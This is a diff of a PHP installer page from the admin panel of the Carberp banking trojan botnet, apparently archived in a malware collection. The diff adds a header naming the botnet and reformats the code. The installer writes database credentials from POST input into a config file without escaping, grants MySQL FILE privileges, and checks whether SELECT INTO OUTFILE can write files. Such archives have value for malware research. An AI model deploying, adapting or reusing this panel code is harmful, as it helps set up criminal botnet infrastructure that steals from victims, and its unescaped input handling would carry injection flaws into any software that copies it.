@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 "<?php echo $lang['nm']; ?>"
 <br /><br />
 <?php
@@ -6,7 +17,8 @@ if($_GET['go'] != 'index') exit;
 $INSTALL = false;
 $ERROR = false;
 
-if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db'])){	$cfg_text = '';
+if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db'])){
+	$cfg_text = '';
 	$cfg_text .= '$cfg_db[\'host\'] = \''.$_POST['host'].'\';' . "\n";
 	$cfg_text .= '$cfg_db[\'user\'] = \''.$_POST['user'].'\';' . "\n";
 	$cfg_text .= '$cfg_db[\'pass\'] = \''.$_POST['pass'].'\';' . "\n";
@@ -27,31 +39,38 @@ if(!empty($_POST['pass'])) $cfg_db['pass'] = $_POST['pass'];
 if(!empty($_POST['db'])) $cfg_db['db'] = $_POST['db'];
 
 $mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
-if(count($mysqli->errors) > 0){	$INSTALL = true;
-}else{	if($_GET['file_save'] != 'no'){
+if(count($mysqli->errors) > 0){
+	$INSTALL = true;
+}else{
+	if($_GET['file_save'] != 'no'){
 		$mysqli->db[0]->query('GRANT FILE ON * . * TO \''.$_POST['user'].'\'@\''.$_POST['host'].'\'');
 
 		$cte = 'QWERYTEST!';
 		$result = $mysqli->query('SELECT concat(urldecode(\''.urlencode($cte).'\')) cte');
 
-		if($result->cte != $cte){			include_once('includes/functions.mysql_urldecode.php');
+		if($result->cte != $cte){
+			include_once('includes/functions.mysql_urldecode.php');
 
 			$mysqli->db[0]->query('DROP FUNCTION IF EXISTS urldecode;');
 			$mysqli->db[0]->query(mysql_urldecode());
 
 			$result = $mysqli->query('SELECT concat(urldecode(\''.urlencode($cte).'\')) cte');
 
-			if($result->cte != $cte){				$INSTALL = true;
+			if($result->cte != $cte){
+				$INSTALL = true;
 				$ERROR = 2;
 			}
 
 		}
 
-		if($ERROR != 2 && $INSTALL != true){			$test_str = md5(time());
+		if($ERROR != 2 && $INSTALL != true){
+			$test_str = md5(time());
 			$file_name = str_replace('\\', '/', '/tmp/' . $test_str);
 			$mysqli->db[0]->query('SELECT concat(urldecode(\''.$test_str.'\')) INTO OUTFILE \''.$file_name.'\' FIELDS TERMINATED BY \';\' LINES TERMINATED BY \'\'');
 
-			if(file_exists($file_name)){				if(file_get_contents($file_name) != $test_str . ';'){					$INSTALL = true;
+			if(file_exists($file_name)){
+				if(file_get_contents($file_name) != $test_str . ';'){
+					$INSTALL = true;
 					$ERROR = 1;
 				}
 				@unlink($file_name);
@@ -62,12 +81,16 @@ if(count($mysqli->errors) > 0){	$INSTALL = true;
 		}
 	}
 
-	if($INSTALL != true){		/*
+	if($INSTALL != true){
+		/*
 		$tb = array();
 		$tables = $mysqli->query('SHOW TABLES', null, null, false);
-		if(count($tables > 0)){			foreach($tables as $t){				$t = get_object_vars($t);
+		if(count($tables > 0)){
+			foreach($tables as $t){
+				$t = get_object_vars($t);
 				$t = array_shift($t);
-                if(preg_match('~_bak$~is', $t) != true){                	$mysqli->query('DROP TABLE IF EXISTS '.$t.'_bak');
+                if(preg_match('~_bak$~is', $t) != true){
+                	$mysqli->query('DROP TABLE IF EXISTS '.$t.'_bak');
                 	$mysqli->query('RENAME TABLE '.$t.' TO '.$t.'_bak');
                 	$tb[$t] = $t;
 				}
@@ -295,7 +318,9 @@ if(count($mysqli->errors) > 0){	$INSTALL = true;
 
 <br />
 <?php
-if($INSTALL != true){	if($_GET['step'] == 3){		$_SESSION['step'] = 3;
+if($INSTALL != true){
+	if($_GET['step'] == 3){
+		$_SESSION['step'] = 3;
 	}
 ?>
 <?php echo $lang['myi']; ?>
@@ -308,8 +333,10 @@ if($INSTALL != true){	if($_GET['step'] == 3){		$_SESSION['step'] = 3;
 <br /><br />
 <?php
 
-if($ERROR == 1){	print('"<span style="color:red">'.$lang['pnr'].'</span>"!');
-}elseif($ERROR == 2){	print('<textarea cols="80" rows="10">'.mysql_urldecode().'</textarea><br /><br />');
+if($ERROR == 1){
+	print('"<span style="color:red">'.$lang['pnr'].'</span>"!');
+}elseif($ERROR == 2){
+	print('<textarea cols="80" rows="10">'.mysql_urldecode().'</textarea><br /><br />');
 	print('"<span style="color:red">'.$lang['nsp'].'</span>"!');
 }else{
 	print('"<span style="color:red">'.$lang['npm'].'</span>"!');
@@ -328,7 +355,8 @@ if($ERROR == 1){	print('"<span style="color:red">'.$lang['pnr'].'</span>"!');
 <?php echo $lang['bad']; ?>:&nbsp;<input type="text" name="db" value="<?php echo $cfg_db['db']; ?>" style="width: 300px">
 <br /><br />
 <?php
-if($ERROR == 1){?>
+if($ERROR == 1){
+?>
 <input type="button" value="<?php echo $lang['skip']; ?>" onclick="if(confirm('<?php echo $lang['skip']; ?> ?')){location = '/install/index.html?step=3&file_save=no';}" />
 <?php
 }
